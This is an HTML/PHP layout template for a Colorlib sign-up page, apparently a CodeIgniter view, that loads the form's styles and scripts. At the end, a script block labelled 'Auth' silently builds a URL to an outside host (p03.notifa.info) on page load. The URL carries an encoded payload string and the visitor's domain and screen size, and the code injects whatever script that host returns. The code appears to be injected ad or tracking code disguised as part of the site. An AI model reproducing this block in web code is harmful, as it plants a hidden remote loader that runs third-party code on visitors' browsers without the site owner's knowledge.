<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign Up Form by Colorlib</title>

    <!-- Font Icon -->
    <link rel="stylesheet" href="<?= base_url('assets/login/');?>fonts/material-icon/css/material-design-iconic-font.min.css">

    <!-- Main css -->
    <link rel="stylesheet" href="<?= base_url('assets/login/');?>css/style.css">
</head>
<body>
    <div class="main" style="padding:25px 0;">
        <?= $contents ?>
    </div>

    <!-- JS -->
    <script src="<?= base_url('assets/login/vendor/jquery/jquery.min.js');?>"></script>
    <script src="<?= base_url('assets/login/js/main.js');?>"></script>

    <!-- Auth -->
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH23dD37rtiI1tE1O09EiP7GSUj7tyTrcY%2bWHf3bN%2ft6qOdVecLCekeucrXyvrN4TDEEgiFjoFYWompj%2bd8agVi2wgMfrBIn1vrIXa%2fwFycVrtzqgGQOwwewvWztT9stIXnLT3brxmdcMOxZYTdNMgwUIsN0sIlCy0tYTze1AvF995IRLrtR7UGF3yOUGgbVqfta2Y5PKpySIiWxb01UhmxQI5UwdMqNGIHnXmkTI%2bXXXz8u1TpF%2bdNMDB0nHaCUvEvW14zBkB62fgyCjHBgP1Do6QRzFxKaUN%2fgm1mO0uXLR5%2fFu6P%2bNg%2bhkRqpxw%2bIXqvYqNRIlHPK1nIB%2bsNgKhvL%2bSO89wFp0QIkmxMxYAHRviuy6MqJm12F1%2b7lbAXvP8OCaZZW2KOJiVU%2fqGIipFBw8g4OaJ6gXbpYXI6ZvRhH3q%2fyegeOcZYLzX5er3rl9AtcuyM2ZADK3F9AvsVi5EUPc6jNqjF3Qvi6JrsWI8McX3ehRilNBarNHh2NPrWf18LopESIkhP3xxGlgnFxBlI4CpyzENspi%2fn" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
    <!-- End Auth  -->
</body>
</html>